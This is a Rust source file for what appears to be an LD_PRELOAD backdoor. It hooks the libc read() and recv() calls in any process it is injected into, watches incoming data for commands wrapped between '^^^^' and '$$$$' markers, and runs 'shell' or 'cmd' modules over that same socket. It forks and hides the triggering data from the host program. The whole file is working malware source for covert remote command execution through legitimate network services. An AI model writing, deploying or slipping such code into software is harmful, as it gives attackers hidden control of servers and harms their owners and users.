mod modules;
mod util;

use std::os::raw::c_void;
use std::ffi::{CStr, CString};
use redhook::{real,hook};
use nix::unistd::{dup2, execv, fork, ForkResult, close, write};
use std::env;
use crate::modules::{shell, cmd};
use crate::util::{split_string,from_c_str};

static HEAD: &str = "^^^^";
static TAIL: &str = "$$$$";

fn run_module(command: &str, fd: i32) {
    let args: &[&str] = &command.split(" ").collect::<Vec<&str>>()[1..];
    let command = split_string(command, " ", 0);
    let result = match command {
        "shell" => shell(fd, args),
        "cmd" => cmd(fd, args),
        _ => "no command".to_string()
    };
    write(fd, result.as_bytes()).unwrap();
}

fn handle_cmd(command: &str, fd: i32) {
    println!("Received command: `{}'", command);
    if command.starts_with("|") {
        run_module(&command[1..], fd);
    } else {
        match fork() {
            Ok(ForkResult::Child) => {
                run_module(command, fd)
            }
            Ok(ForkResult::Parent { child, .. }) => {
                close(fd).unwrap();
            }
            Err(_) => {}
        }
    }
}

fn handle_hook(buf: &str, fd: i32) -> bool {
    if let Some(start) = buf.find(HEAD)  {
        if let Some(end) = buf[start..].find(TAIL) {
            env::set_var("LD_PRELOAD", "");
            handle_cmd(&buf[start+HEAD.len()..end], fd);
            return true;
        }
    } else {
        return false;
    }
    false
}

hook! {
    unsafe fn read(fd: i32, buf: *mut c_void, count: u32) -> i32 => my_read {
        let real_ret = real!(read)(fd, buf, count);
        if handle_hook(&from_c_str(buf), fd) {
            0
        } else {
            real_ret
         }
    }
}

hook! {
    unsafe fn recv(fd: i32, buf: *mut c_void, count: u32, flags: i32) -> i32 => my_recv {
        let real_ret = real!(recv)(fd, buf, count, flags);
        if handle_hook(&from_c_str(buf), fd) {
            0
        } else {
            real_ret
         }
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        assert_eq!(2 + 2, 4);
    }
}
